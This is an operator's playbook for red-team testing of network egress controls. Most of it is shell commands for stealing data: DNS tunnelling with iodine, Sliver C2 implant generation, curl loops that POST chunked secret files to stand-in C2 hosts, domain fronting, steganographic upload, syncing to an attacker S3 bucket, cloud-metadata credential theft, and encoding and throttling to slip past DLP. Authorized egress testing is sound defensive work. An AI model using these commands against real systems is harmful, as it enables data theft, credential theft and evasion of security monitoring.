# Data Exfiltration Attack Playbook

> Operator's playbook for red-teaming egress controls. Walks through engagement scoping, lab setup, channel selection, attack workflow, DLP/SWG evasion, and reporting. Target audience: experienced offensive operators already familiar with network protocols, TCP/IP fundamentals, and MITRE ATT&CK TA0010/TA0011.

## 1. Engagement Scoping

### 1.1 Confirm scope

| Item | Detail |
|------|--------|
| Target environment | Corp / OT / cloud / air-gapped |
| Allowed channels | DNS / HTTPS / ICMP / Stego / Cloud / All |
| Allowed exfil volume | <1MB / <100MB / Unlimited |
| DLP/SWG/CASB in scope | Zscaler / Netskope / Forcepoint / Symantec / Bluecoat |
| Air-gapped testing | yes / no |
| Steganography testing | yes / no |
| LOLBin use | allowed / restricted |
| Out of scope | destructive exfil (wipe), volume attacks (DoS), DoS of egress |
| Time window | |
| Communications channel | |

### 1.2 Rules of engagement

- **No destructive exfil** — never wipe source data after exfil
- **No DoS** of egress infrastructure
- **Notify ops** before any >1GB exfil (avoid alert storms)
- **Pause testing** if any production service affected
- **Real customer data prohibited** — use synthetic PII only
- **Coordinate with SOC** for detection validation

### 1.3 Test boundaries

- Allowed: synthetic data exfil over authorized channels
- Allowed (with approval): large-volume exfil up to agreed cap
- Disallowed: real customer PII, classified data, production source-of-truth

## 2. Pre-Engagement Recon

### 2.1 Map egress surface

```bash
# Outbound port scan (test allowed ports)
for port in 53 80 443 123 445 3306 3389 5432 5900 8080 8443; do
  timeout 2 nc -vz exit-proxy.example.com $port 2>&1 | grep -E "succeeded" && echo "Port $port OPEN"
done

# UDP test
for port in 53 123 161 500; do
  timeout 2 nc -uvz exit-proxy.example.com $port 2>&1 | head -2
done

# Egress proxy detection
curl -sI http://msftncsi.com | head -3
curl -s http://checkip.amazonaws.com/
```

### 2.2 DNS egress analysis

```bash
# Test internal DNS recursion
dig +short AAAA exfil.attacker.example.com @internal-dns.example.com

# Test TXT record exfil feasibility
dig TXT $(openssl rand -hex 16).t1.exfil.example.com @8.8.8.8

# Test long label support
dig +short A $(python3 -c "print('a'*60 + '.exfil.example.com')")

# Test DoH (DNS over HTTPS)
curl -s 'https://1.1.1.1/dns-query?name=test.exfil.example.com&type=A' \
  -H 'Accept: application/dns-json' | jq -r '.Answer[0].data'
```

### 2.3 Identify DLP/SWG

```bash
# Response headers
curl -sI https://www.google.com | grep -iE "zscaler|netskope|forcepoint|bluecoat|symantec|cisco|paloalto|fortinet"

# TLS inspection (look for interception CA)
echo | openssl s_client -showcerts -connect www.google.com:443 -servername www.google.com 2>&1 \
  | grep -iE "issuer=|verify return"

# Client cert request (mTLS CASB)
echo | openssl s_client -connect www.google.com:443 2>&1 | grep -i "Acceptable client certificate CA names"
```

### 2.4 Identify allowed SaaS

```bash
# Test reachability of common SaaS
for svc in drive.google.com outlook.office365.com api.github.com api.slack.com api.telegram.org; do
  curl -sI https://$svc -o /dev/null -w "%{http_code} $svc\n" --connect-timeout 3
done
```

## 3. Lab Setup

### 3.1 Local DNS server (for tunnel testing)

```bash
sudo apt install bind9 bind9utils

# Configure zone
cat > /etc/bind/named.conf.local << EOF
zone "exfil.example.com" {
    type master;
    file "/etc/bind/db.exfil";
    allow-query { any; };
};
EOF

cat > /etc/bind/db.exfil << EOF
\$ORIGIN exfil.example.com.
\$TTL 86400
@       IN  SOA ns1.exfil.example.com. admin.exfil.example.com. (
            2025010101 ; serial
            3600       ; refresh
            1800       ; retry
            604800     ; expire
            86400 )    ; minimum
        IN  NS  ns1.exfil.example.com.
ns1     IN  A   198.51.100.10
EOF

sudo systemctl restart bind9
```

### 3.2 iodine test environment

```bash
# Install
sudo apt install iodine

# Server (your attacker NS)
iodined -c -f -P REPLACE_WITH_YOUR_PW 172.16.0.1 t1.exfil.example.com

# Client (test victim)
iodine -P REPLACE_WITH_YOUR_PW t1.exfil.example.com

# Verify TUN device
ip addr show dns0

# SSH/SCP over tunnel
ssh user@172.16.0.1
```

### 3.3 Sliver C2 lab

```bash
# Install Sliver
curl https://sliver.sh/install | sudo bash

# Start server
sliver

# Generate implant
sliver > generate --http https://localhost:8443 --os linux --arch amd64

# Implant listener
sliver > http
```

### 3.4 Steganography tools

```bash
# steghide (JPEG/BMP/WAV/AU)
sudo apt install steghide

# zsteg (PNG/BMP)
gem install zsteg

# outguess
sudo apt install outguess

# OpenStego
wget https://github.com/syvaidya/openstego/releases/download/v0.8.6/openstego-0.8.6.zip
```

### 3.5 DLP test environment

```bash
# OpenDLP
docker run -d -p 8080:8080 opendlp/server

# Generate synthetic PII
python3 -c "
import random
for _ in range(100):
    ssn = f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}'
    cc = f'{random.randint(4000,5999)} {random.randint(1000,9999)} {random.randint(1000,9999)} {random.randint(1000,9999)}'
    print(f'SSN: {ssn}  CC: {cc}')
" > synthetic-pii.txt
```

## 4. Attack Workflow — Stage by Stage

### Stage 1 — Recon (4-8 hours)

**Goal**: produce egress capability map.

```bash
# All ports, all protocols
for proto in tcp udp; do
  for port in 53 80 443 123 445 3306 5432 8080 8443; do
    timeout 2 nc -${proto:0:1}vz exit-proxy $port 2>&1 | grep -E "succeeded" \
      && echo "$proto/$port OPEN"
  done
done

# Identify DLP/SWG vendor
curl -sI https://www.google.com | grep -iE "zscaler|netskope|forcepoint"
```

**Output**: `recon.md` with port matrix + DLP vendor identification.

### Stage 2 — Channel Selection (1 hour)

Pick channels based on egress surface:

| Egress allows | Recommended channels |
|---------------|---------------------|
| DNS only | iodine / dnscat2 |
| DNS + HTTPS | Sliver HTTPS + DNS backup |
| ICMP | Hans / ptunnel |
| File uploads | Stego (PNG/PDF) |
| Cloud SaaS | Google Drive / GitHub gist |
| All | Multi-channel rotation |

### Stage 3 — Payload Prep (1 hour)

```bash
# Compress + encrypt
tar czf - /secret | openssl enc -aes-256-cbc -k "$KEY" -out exfil.enc

# Chunk (for slow exfil)
split -b 256 exfil.enc chunk_

# Or base64 for text channel
base64 -w0 exfil.enc > exfil.b64
```

### Stage 4 — DNS Tunnel (4 hours)

```bash
# Server (attacker NS)
iodined -c -f -P REPLACE_WITH_YOUR_PW 172.16.0.1 t1.exfil.example.com

# Client (victim)
iodine -P REPLACE_WITH_YOUR_PW t1.exfil.example.com

# Verify TUN
ip addr show dns0

# SCP 1GB file over DNS (slow but works)
scp -r /secret user@172.16.0.1:/tmp/
```

### Stage 5 — HTTPS C2 + Exfil (4 hours)

```bash
# Sliver HTTPS implant
sliver > generate --http https://c2.example.com --os linux
sliver > http

# Execute implant on victim
./implant.elf

# Implant beacons every 30s, exfil via POST

# Or beacon-style manual exfil
while read chunk; do
  curl -X POST https://c2.example.com/api/upload \
    -H "Authorization: Bearer $TOKEN" \
    -H "User-Agent: Mozilla/5.0" \
    --data-binary "@$chunk"
  sleep 60
done < chunks.txt
```

### Stage 6 — Domain Fronting (1 hour)

```bash
# Set up behind Cloudflare
# Register c2.example.com → Cloudflare → your origin

# From victim: front via legit CDN customer domain
curl -H "Host: c2.example.com" \
     https://legitimate-cdn-customer.example.com/ \
     --data-binary @secret.enc
```

### Stage 7 — Stego Exfil (1 hour)

```bash
# Generate cover image
ffmpeg -f lavfi -i color=black:s=1920x1080:d=1 cover.png

# Embed
steghide embed -cf cover.png -ef secret.enc -p REPLACE_WITH_YOUR_PW -sf stego.png

# Upload to image share
curl -X POST https://images.example.com/upload -F "file=@stego.png"
```

### Stage 8 — Cloud Exfil (1 hour)

```bash
# AWS S3 (using stolen creds)
aws s3 sync /secret s3://attacker-bucket/

# Or via IMDS-extracted creds
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name)

# Or Google Drive via rclone
rclone copy /secret gdrive:exfil/
```

### Stage 9 — DLP Bypass (1 hour)

```bash
# Triple-encode
openssl enc -aes-256-cbc -k "$KEY" -in secret.enc -out stage1.bin
gzip stage1.bin
base64 -w0 stage1.bin.gz > stage2.b64

# Slow exfil
split -b 256 exfil.enc small_chunk_
for c in small_chunk_*; do
  curl -s https://c2.example.com/upload --data-binary "@$c"
  sleep 60
done
```

### Stage 10 — Reporting (1 day)

Produce engagement report:
- Channels tested (success/fail)
- Volume exfil'd per channel
- DLP/SWG alerts triggered
- Detection gaps + remediation roadmap

## 5. Common Pitfalls

### 5.1 Crashing egress proxy with volume

Mass exfil can DoS egress proxy → ops impact.

**Fix**: Throttle. Test small volumes first. Coordinate with ops.

### 5.2 Tripping real customer data DLP

Accidentally using real customer data in test → legal/privacy incident.

**Fix**: Use only synthetic PII. Verify file contents before exfil.

### 5.3 Misjudging OT network isolation

OT networks often allow specific protocols only. Wrong assumption = no exfil.

**Fix**: Test Modbus/DNP3/OPC UA egress first. Adapt channel accordingly.

### 5.4 Over-stepping into air-gapped

Air-gapped testing requires explicit approval.

**Fix**: Confirm scope. Use EM/acoustic/power-line only if explicitly approved.

### 5.5 Leaving infrastructure fingerprints

Persistent C2 / domain registration can leak operator identity.

**Fix**: Use privacy-respecting domain registrars. Rotate infrastructure.

## 6. Time Budget Cheat Sheet

| Engagement size | Recon | Channel setup | Exfil run | DLP bypass | Reporting |
|-----------------|-------|---------------|-----------|------------|-----------|
| Single host test | 2h | 4h | 2h | 2h | 1d |
| Single segment | 4h | 1d | 4h | 4h | 1d |
| Multi-site estate | 1d | 2d | 1d | 1d | 2d |
| Full enterprise + cloud | 2d | 3d | 2d | 2d | 3d |

## 7. Tool Inventory

### 7.1 Offensive (DNS/ICMP tunnels)

| Tool | Purpose | Notes |
|------|---------|-------|
| `iodine` | IP-over-DNS | Most popular |
| `dnscat2` | C2 over DNS | Encrypted |
| `dns2tcp` | TCP-over-DNS | SSH/SMTP relay |
| `hans` | ICMP tunnel | TUN device |
| `ptunnel` | TCP-over-ICMP | SSH relay |
| `icmptunnel` | ICMP tunnel | Reliable |
| `sish` | ngrok alt | HTTP tunnels |

### 7.2 Offensive (HTTPS C2)

| Tool | Purpose | Notes |
|------|---------|-------|
| `Sliver` | HTTPS/DNS C2 | Go-based |
| `Mythic` | Modular C2 | Docker-based |
| `Havoc` | HTTPS C2 | C++ implant |
| `Merlin` | HTTP/2 C2 | Go |
| `Covenant` | .NET C2 | Windows focus |
| `PoshC2` | PowerShell C2 | Windows |
| `chisel` | HTTP tunnel | mTLS support |
| `gost` | Multi-proto tunnel | SOCKS/HTTP/TLS |

### 7.3 Offensive (Stego)

| Tool | Purpose | Notes |
|------|---------|-------|
| `steghide` | JPG/BMP/WAV/AU steg | Most popular |
| `zsteg` | PNG/BMP LSB | Ruby |
| `outguess` | JPEG stego | Old but works |
| `OpenStego` | GUI stego | Java |
| `stegosuite` | GUI stego | Java |
| `exiftool` | Metadata manipulation | Universal |
| `coagula` | Audio steg | Spectrogram |

### 7.4 Detection development

| Tool | Purpose |
|------|---------|
| Zeek DNS analyzers | DNS tunneling detection |
| Suricata exfil ruleset | Volume + protocol detection |
| Sigma rules | SIEM pattern |
| RSA NetWitness | Behavior analytics |
| Splunk UBA | User behavior baseline |

## 8. Engagement Quality Checklist

Before reporting complete:

- [ ] All in-scope channels tested (DNS/HTTPS/ICMP/Stego/Cloud)
- [ ] DLP/SWG vendor identified
- [ ] Volume exfil'd documented per channel
- [ ] DLP/SWG alerts triggered (or not)
- [ ] Detection rules authored for ≥3 gaps
- [ ] Cleanup performed (artifacts removed)
- [ ] Customer debrief scheduled
- [ ] Final report delivered
- [ ] SOC handoff (detection tuning)

## 9. References

- MITRE ATT&CK TA0010 — Exfiltration
- MITRE ATT&CK TA0011 — Command and Control
- CISA AA21-148A — DarkSide Ransomware (exfil)
- Mandiant APT1 Report (DNS tunneling)
- SolarWinds SUNBURST Analysis (FireEye, 2020)
- Google TAG — APT41 Operations
- "Network Security Assessment" (McNutt, 2024)
- "Security Engineering" (Anderson, 3rd Edition)
- OWASP Egress Testing Guide
- IETF RFC 7858 — DNS over TLS
- IETF RFC 8484 — DNS over HTTPS
- SANS ICS — OT Egress Monitoring
- "Hacking Exposed: Network Security" (3rd Edition, 2024)
- "DNS Tunneling Detection" (BlackHat USA 2023)
- "Steganographic Exfiltration" (DEF CON 24)
- "Air-Gap Exfiltration" (Guri, Ben-Gurion University)
- "GSMem" (Guri et al., 2015)
- "PowerHammer" (Guri et al., 2018)
- "ODINI" (Guri, 2018)
- Conti Leaks Analysis (2021-2022)
- LockBit Black Manual (leaked 2022)
- BlackCat/ALPHV Whitepaper (Cisco Talos, 2023)

